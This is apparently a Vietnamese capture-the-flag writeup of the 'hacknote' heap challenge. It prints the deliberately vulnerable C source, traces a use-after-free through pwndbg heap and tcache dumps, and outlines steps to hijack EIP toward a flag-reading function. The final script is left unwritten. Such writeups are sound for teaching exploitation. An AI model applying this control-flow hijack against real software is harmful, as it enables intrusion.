---
layout: post
title:  "Hacknote writeup"
date:   2020-11-14
categories: Writeup, pwn
---

Shout out to [fr0ster](https://www.hackthebox.eu/home/users/profile/274480) ! Thank you for your help!

[Challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote)


**1.Source code**

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

struct note {
  void (*printnote)();
  char *content;
};

struct note *notelist[5];
int count = 0;

void print_note_content(struct note *this) { puts(this->content); }
void add_note() {
  int i;
  char buf[8];
  int size;
  if (count > 5) {
    puts("Full");
    return;
  }
  for (i = 0; i < 5; i++) {
    if (!notelist[i]) {
      notelist[i] = (struct note *)malloc(sizeof(struct note));
      if (!notelist[i]) {
        puts("Alloca Error");
        exit(-1);
      }
      notelist[i]->printnote = print_note_content;
      printf("Note size :");
      read(0, buf, 8);
      size = atoi(buf);
      notelist[i]->content = (char *)malloc(size);
      if (!notelist[i]->content) {
        puts("Alloca Error");
        exit(-1);
      }
      printf("Content :");
      read(0, notelist[i]->content, size);
      puts("Success !");
      count++;
      break;
    }
  }
}

void del_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  if (notelist[idx]) {
    free(notelist[idx]->content);
    free(notelist[idx]);
    puts("Success");
  }
}

void print_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  if (notelist[idx]) {
    notelist[idx]->printnote(notelist[idx]);
  }
}

void magic() { system("cat flag"); }

void menu() {
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  printf("Your choice :");
};

int main() {
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  char buf[4];
  while (1) {
    menu();
    read(0, buf, 4);
    switch (atoi(buf)) {
    case 1:
      add_note();
      break;
    case 2:
      del_note();
      break;
    case 3:
      print_note();
      break;
    case 4:
      exit(0);
      break;
    default:
      puts("Invalid choice");
      break;
    }
  }
  return 0;
}
```
**2.Review source code**

Các điểm cần lưu ý:
- Vùng cấp phát bộ nhớ của note có 2 pointer **printnote** và **content**.
```
struct note {
  void (*printnote)();
  char *content;
};
```
- Hàm **del_note** thực hiện free notelist->content, nhưng không thực hiện reset pointer **printnote**.
```
void del_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  if (notelist[idx]) {
    free(notelist[idx]->content);
    free(notelist[idx]);
    puts("Success");
  }
}
```

**3.Review heap**

- Thông tin binary
```
[*] '/root/Desktop/pwn/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
- Mở file bằng gdb
```
gdb ./hacknote
```
- Hiển thị các function
```
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x08048458  _init
0x08048490  read@plt
0x080484a0  printf@plt
0x080484b0  _exit@plt
0x080484c0  free@plt
0x080484d0  __stack_chk_fail@plt
0x080484e0  malloc@plt
0x080484f0  puts@plt
0x08048500  system@plt
0x08048510  exit@plt
0x08048520  __libc_start_main@plt
0x08048530  setvbuf@plt
0x08048540  atoi@plt
0x08048550  __gmon_start__@plt
0x08048560  _start
0x08048590  __x86.get_pc_thunk.bx
0x080485a0  deregister_tm_clones
0x080485d0  register_tm_clones
0x08048610  __do_global_dtors_aux
0x08048630  frame_dummy
0x0804865b  print_note_content
0x08048676  add_note
0x08048804  del_note
0x080488d5  print_note
0x08048986  magic
0x0804899f  menu
0x08048a38  main
0x08048b00  __libc_csu_init
0x08048b60  __libc_csu_fini
0x08048b64  _fini
```
- Đặt break tại các function **add_note, del_note, print_note**

```
pwndbg> b * add_note 
Breakpoint 1 at 0x8048676
pwndbg> b * del_note 
Breakpoint 2 at 0x8048804
pwndbg> b * print_note
Breakpoint 3 at 0x80488d5
```
- Thực thi bằng **run**
```
run
```
- Chọn **add_note** và nhập giá trị size là **32** và content là **AAAA**, nhập c để chương trình tiếp tục chạy

```
pwndbg> c
Continuing.
Note size :32
Content :AAAA
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :
```
- Chọn **del_note** để free note. Chương trình sẽ break trước khi thực hiện việc free, vì vậy lúc này ta có thể kiểm tra thông tin heap.
- Sử dụng **vis_heap_chunks** để kiểm tra vùng heap
```
0x804b190	0x00000000	0x00000000	........
0x804b198	0x00000000	0x00000011	........
0x804b1a0	0x0804865b	0x0804b1b0	[.......
0x804b1a8	0x00000000	0x00000031	....1...
0x804b1b0	0x41414141	0x0000000a	AAAA....
0x804b1b8	0x00000000	0x00000000	........
0x804b1c0	0x00000000	0x00000000	........
0x804b1c8	0x00000000	0x00000000	........
0x804b1d0	0x00000000	0x00000000	........
0x804b1d8	0x00000000	0x00021e29	....)...	 <-- Top chunk

```
- **0x41414141** chính là **AAAA** do ta nhập vào. **0x0804865b** là vùng nhớ con trỏ **print_note** trỏ vào. Ta có thể kiểm tra bằng lệnh **info symbol**.

```
pwndbg> info symbol 0x0804865b
print_note_content in section .text of /root/Desktop/pwn/hacknote
```
- Nhập c để tiếp tục và chọn 0. Lúc này chương trình sẽ thực hiện xóa note[0] tạo bên trên.

```
pwndbg> c
Continuing.
Index :0
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :
```
- Chọn **Print note** và kiểm tra heap sau khi thực hiện **Delete note** bằng **vis_heap_chunks**.

```
0x804b198	0x00000000	0x00000011	........
0x804b1a0	0x00000000	0x0804b010	........	 <-- tcachebins[0x10][0/1]
0x804b1a8	0x00000000	0x00000031	....1...
0x804b1b0	0x00000000	0x0804b010	........	 <-- tcachebins[0x20][0/1]
0x804b1b8	0x00000000	0x00000000	........
0x804b1c0	0x00000000	0x00000000	........
0x804b1c8	0x00000000	0x00000000	........
0x804b1d0	0x00000000	0x00000000	........
0x804b1d8	0x00000000	0x00021e29	....)...	 <-- Top chunk
```

- Kiểm tra heap ta thấy bark tới **0x804b1a0** và **0x804b1b0** đã được free và có giá trị là **0x00000000**. Ấn c để tiếp tục, và chọn 0
```
pwndbg> c
Continuing.
Index :0

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x0
 EBX  0x0
*ECX  0xffffd2b9 ◂— 0xf7fa0a
*EDX  0x804b1a0 ◂— 0x0
 EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
*EBP  0xffffd2c8 —▸ 0xffffd2e8 ◂— 0x0
*ESP  0xffffd29c —▸ 0x804896f (print_note+154) ◂— add    esp, 0x10
*EIP  0x0

```
- Chương trình lập tức crash và EIP lúc này có giá trị là **0x00000000**. Lí do là vì con trỏ của **print_note** không được reset mà vẫn đang trỏ tới địa chỉ **0x804b1a0**, đồng thời do ta đã thực hiện free trước đó nên địa chỉ **0x804b1a0** chỉ lưu **0x00000000**. Đây là điểm ta có thể khai thác bằng Use-after-free. 

**4.Use-After-Free và Heap**

- Trước khi khai thác, ta cần làm rõ một số vấn đề về Heap.
- Hầu hết các chương trình trong quá trình thực thi sử dụng malloc để cấp không gian trên heap cho 1 object nào đó. Sử dụng kernel để quản lí memory có nhiều rủi ro, vì thế các chương trình này sẽ sử dụng glibc để quản lí memory, glibc sẽ yêu cầu kernel cung cấp memory. Vùng memory được kernel cấp cho glibc được gọi là heap.
- Sau khi được cấp vùng heap, glibc sẽ tạo ra các chunk cho từng đối tượng và trỏ pointer của chương trình tới các chunk này.
- Khi chương trình thực hiện free memory, glibc sẽ không trả lại vùng memory này cho kernel, thay vào đó glibc đưa các chunk này vào các bins. Các chunk được đặt trong bins sẽ có thể được glibc cấp phát cho lần yêu cầu khác của chương trình thay vì glibc lại yêu cầu kernel cấp mới. Cho dễ hiểu, nó giống như việc tái sử dụng những gì có sẵn.
- Glibc sử dụng nhiều bins để quản lý bộ nhớ, bao gồm: tcachebins, fastbins, unsorted bins. Việc sử dụng bins nào để lưu chunk thì có nhiều lí do. Một trong những lí do quan trọng trong việc quyết định chunk được lưu ở bins nào là size memory được yêu cầu free.
- Nếu đoạn trên quá khó hiểu, thì ta sẽ từ từ phân tích trong quá trình exploit.
- Tương tự mục 3, ta đặt break tại các function **add_note, del_note, print_note**

```
pwndbg> b * add_note 
Breakpoint 1 at 0x8048676
pwndbg> b * del_note 
Breakpoint 2 at 0x8048804
pwndbg> b * print_note
Breakpoint 3 at 0x80488d5
```
- Lần lượt thực hiện add_note 3 lần với thông tin như sau:

```
Note[0]: Size 32, Content "AAAA"
Note[1]: Size 32, Content "BBBB"
Note[2]: Size 32, Content "CCCC"
```
- Chọn **del_note**, lúc này chương trình sẽ break trước khi del, vì vậy heap vẫn còn nguyên 3 chunk cho 3 Note. Sử dụng **vis_heap_chunks** để kiểm tra heap

```
0x804b198	0x00000000	0x00000011	........
0x804b1a0	0x0804865b	0x0804b1b0	[.......
0x804b1a8	0x00000000	0x00000031	....1...
0x804b1b0	0x41414141	0x0000000a	AAAA....
0x804b1b8	0x00000000	0x00000000	........
0x804b1c0	0x00000000	0x00000000	........
0x804b1c8	0x00000000	0x00000000	........
0x804b1d0	0x00000000	0x00000000	........
0x804b1d8	0x00000000	0x00000011	........
0x804b1e0	0x0804865b	0x0804b1f0	[.......
0x804b1e8	0x00000000	0x00000031	....1...
0x804b1f0	0x42424242	0x0000000a	BBBB....
0x804b1f8	0x00000000	0x00000000	........
0x804b200	0x00000000	0x00000000	........
0x804b208	0x00000000	0x00000000	........
0x804b210	0x00000000	0x00000000	........
0x804b218	0x00000000	0x00000011	........
0x804b220	0x0804865b	0x0804b230	[...0...
0x804b228	0x00000000	0x00000031	....1...
0x804b230	0x43434343	0x0000000a	CCCC....
0x804b238	0x00000000	0x00000000	........
0x804b240	0x00000000	0x00000000	........
0x804b248	0x00000000	0x00000000	........
0x804b250	0x00000000	0x00000000	........
0x804b258	0x00000000	0x00021da9	........	 <-- Top chunk
```

- Để ý thấy **0x804b1a0, 0x804b1e0, 0x804b220** tương ứng với con trỏ **print_note** của **notelist[0], notelist[1], notelist[2]**
- Ấn c để tiếp tục chương trình, chọn 0 để giải phóng **notelist[0]**

```
pwndbg> c
Continuing.
Index :0
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :
```
- Tiếp tục chọn **Delete note** và chương trình sẽ dừng tại break point. Lúc này **notelist[0]** đã được giải phóng. Heap lúc này sẽ như sau

```
0x804b198	0x00000000	0x00000011	........
0x804b1a0	0x00000000	0x0804b010	........	 <-- tcachebins[0x10][0/1]
0x804b1a8	0x00000000	0x00000031	....1...
0x804b1b0	0x00000000	0x0804b010	........	 <-- tcachebins[0x20][0/1]
0x804b1b8	0x00000000	0x00000000	........
0x804b1c0	0x00000000	0x00000000	........
0x804b1c8	0x00000000	0x00000000	........
0x804b1d0	0x00000000	0x00000000	........
0x804b1d8	0x00000000	0x00000011	........
0x804b1e0	0x0804865b	0x0804b1f0	[.......
0x804b1e8	0x00000000	0x00000031	....1...
0x804b1f0	0x42424242	0x0000000a	BBBB....
0x804b1f8	0x00000000	0x00000000	........
0x804b200	0x00000000	0x00000000	........
0x804b208	0x00000000	0x00000000	........
0x804b210	0x00000000	0x00000000	........
0x804b218	0x00000000	0x00000011	........
0x804b220	0x0804865b	0x0804b230	[...0...
0x804b228	0x00000000	0x00000031	....1...
0x804b230	0x43434343	0x0000000a	CCCC....
0x804b238	0x00000000	0x00000000	........
0x804b240	0x00000000	0x00000000	........
0x804b248	0x00000000	0x00000000	........
0x804b250	0x00000000	0x00000000	........
0x804b258	0x00000000	0x00021da9	........	 <-- Top chunk
```
- Ta có thể thấy 2 dòng **tcachebins[0x10][0/1]** và **tcachebins[0x20][0/1]**. Đây chính là bin mà glibc sử dụng để lưu chunk sau khi free! Ta sẽ kiểm tra xem **tcachebins** lúc này như nào

```
pwndbg> tcachebins 
tcachebins
0x10 [  1]: 0x804b1a0 — 0x0
0x20 [  1]: 0x804b1b0 — 0x0
```
- Ở đây có 2 bin là 0x10 và 0x20. Các địa chỉ của **print_note** đang được lưu ở bin 0x10 và địa chỉ của **content** được lưu ở 0x20.
- Ấn c để tiếp tục, lần này ta delete **note_list[1]**. Sau đó ta tiếp tục chọn **del_note**. Ta tiếp tục kiểm tra heap và tcachebins khi function đang break

```
0x804b1a0	0x00000000	0x0804b010	........	 <-- tcachebins[0x10][1/2]
0x804b1a8	0x00000000	0x00000031	....1...
0x804b1b0	0x00000000	0x0804b010	........	 <-- tcachebins[0x20][1/2]
0x804b1b8	0x00000000	0x00000000	........
0x804b1c0	0x00000000	0x00000000	........
0x804b1c8	0x00000000	0x00000000	........
0x804b1d0	0x00000000	0x00000000	........
0x804b1d8	0x00000000	0x00000011	........
0x804b1e0	0x0804b1a0	0x0804b010	........	 <-- tcachebins[0x10][0/2]
0x804b1e8	0x00000000	0x00000031	....1...
0x804b1f0	0x0804b1b0	0x0804b010	........	 <-- tcachebins[0x20][0/2]
0x804b1f8	0x00000000	0x00000000	........
0x804b200	0x00000000	0x00000000	........
0x804b208	0x00000000	0x00000000	........
0x804b210	0x00000000	0x00000000	........
0x804b218	0x00000000	0x00000011	........
0x804b220	0x0804865b	0x0804b230	[...0...
0x804b228	0x00000000	0x00000031	....1...
0x804b230	0x43434343	0x0000000a	CCCC....
0x804b238	0x00000000	0x00000000	........
0x804b240	0x00000000	0x00000000	........
0x804b248	0x00000000	0x00000000	........
0x804b250	0x00000000	0x00000000	........
0x804b258	0x00000000	0x00021da9	........	 <-- Top chunk
```

```
pwndbg> tcachebins 
tcachebins
0x10 [  2]: 0x804b1e0 — 0x804b1a0 — 0x0
0x20 [  2]: 0x804b1f0 — 0x804b1b0 — 0x0
```

- Lần lượt các địa chỉ **0x804b1e0** và **0x804b1f0** được thêm vào **0x10** và **0x20**
- Ấn c để tiếp tục, lần này ta delete **note_list[2]**. Sau đó ta chọn **add_note**. Lần này ta sẽ dùng **add_note** để xem glibc sẽ sử dụng chunk trong tcachebins như thế nào. Tất nhiên, chương trình sẽ break trước khi ta thực hiện add_note.

```
pwndbg> tcachebins 
tcachebins
0x10 [  2]: 0x804b220 — 0x804b1e0 — 0x804b1a0 — 0x0
0x20 [  2]: 0x804b230 — 0x804b1f0 — 0x804b1b0 — 0x0
```
- Lần lượt các địa chỉ **0x804b220** và **0x804b230** được thêm vào **0x10** và **0x20**
- Ấn c để tiếp tục việc **add_note**. Lần này ta chọn size 8 và content là **FFFF** . Lí do ta chọn 8 là vì ta cần 1 chunk < size 32, vì nếu to quá, glibc sẽ không sử dụng địa chỉ từ bins để cấp phát bộ nhớ cho đối tượng **note_list[3]**.

```
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :8
Content :FFFF
Success !
```
- Chọn **print_note** và chương trình break. Ta kiểm tra heap và **tcachebins** lúc này

```
0x804b198	0x00000000	0x00000011	........
0x804b1a0	0x00000000	0x0804b010	........	 <-- tcachebins[0x10][0/1]
0x804b1a8	0x00000000	0x00000031	....1...
0x804b1b0	0x00000000	0x0804b010	........	 <-- tcachebins[0x20][2/3]
0x804b1b8	0x00000000	0x00000000	........
0x804b1c0	0x00000000	0x00000000	........
0x804b1c8	0x00000000	0x00000000	........
0x804b1d0	0x00000000	0x00000000	........
0x804b1d8	0x00000000	0x00000011	........
0x804b1e0	0x46464646	0x0000000a	FFFF....
0x804b1e8	0x00000000	0x00000031	....1...
0x804b1f0	0x0804b1b0	0x0804b010	........	 <-- tcachebins[0x20][1/3]
0x804b1f8	0x00000000	0x00000000	........
0x804b200	0x00000000	0x00000000	........
0x804b208	0x00000000	0x00000000	........
0x804b210	0x00000000	0x00000000	........
0x804b218	0x00000000	0x00000011	........
0x804b220	0x0804865b	0x0804b1e0	[.......
0x804b228	0x00000000	0x00000031	....1...
0x804b230	0x0804b1f0	0x0804b010	........	 <-- tcachebins[0x20][0/3]
0x804b238	0x00000000	0x00000000	........
0x804b240	0x00000000	0x00000000	........
0x804b248	0x00000000	0x00000000	........
0x804b250	0x00000000	0x00000000	........
0x804b258	0x00000000	0x00021da9	........	 <-- Top chunk
```

```
pwndbg> tcachebins 
tcachebins
0x10 [  1]: 0x804b1a0 — 0x0
0x20 [  3]: 0x804b230 — 0x804b1f0 — 0x804b1b0 — 0x0
```
- Quan sát kĩ và ta thấy rằng **0x804b220** và **0x804b1e0** đã được sử dụng để cấp cho **note_list[3]**. Trong đó **0x804b220** sử dụng cho **print_note** và **0x804b1e0** sử dụng cho content **FFFF**. Tại sao lại như vậy ? Câu trả lời ở đây nằm ở việc glibc lấy dữ liệu ra khỏi tcachebins. Tcachbins lưu trữ theo nguyên tắc LIFO (Last in first out). Vì thế, khi glibc cấp vùng nhớ cho **note_list[3]**, đầu tiên glibc sẽ lấy **0x804b220** để cấp cho **print_note** và say đó là **0x804b1e0** cho **FFFF**. Tại sao lại cấp cho **print_note** trước **Content** ? Đó là vì code thực hiện như vậy!

```
struct note {
  void (*printnote)();
  char *content;
};
```
- Tiếp tục kiểm tra, ta nhận thấy rằng **0x804b1e0** trước đó là địa chỉ chứa thông tin mà **note_list[2]->print_note** trỏ tới (trước khi free **note_list[1]**, nó lưu giá trị **0x0804865b**). Vậy nghĩa là nếu ta gọi **print_note** cho **note_list[1]**, EIP sẽ có giá trị là **FFFF**. Để kiểm chứng việc này, ta sẽ ấn c để tiếp tục, và nhập giá trị index là 1

```
pwndbg> c
Continuing.
Index :1

Program received signal SIGSEGV, Segmentation fault.
0x46464646 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x46464646 ('FFFF')
 EBX  0x0
*ECX  0xffffd2b9 — 0xf7fa0a
*EDX  0x804b1e0 — 'FFFF\n'
 EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
*EBP  0xffffd2c8 — 0xffffd2e8 ◂— 0x0
*ESP  0xffffd29c — 0x804896f (print_note+154) ◂— add    esp, 0x10
*EIP  0x46464646 ('FFFF')
```
- Và ta đã có thể control EIP theo ý muốn.

**5.How2heap**
- Dựa vào những điều phân tích trên, ta có kịch bản để control EIP gọi tới hàm **magic** như sau:
+ Add_note 0 size 32, content AAAA
+ Add_note 1 size 32, content AAAA
+ Add_note 2 size 32, content AAAA
+ Delete note 0
+ Delete note 1
+ Delete note 2
+ Add_note 3 size 8, content là địa chỉ của **magic**
+ Gọi Print_note với index là 1

**6.Script**
- Update sau....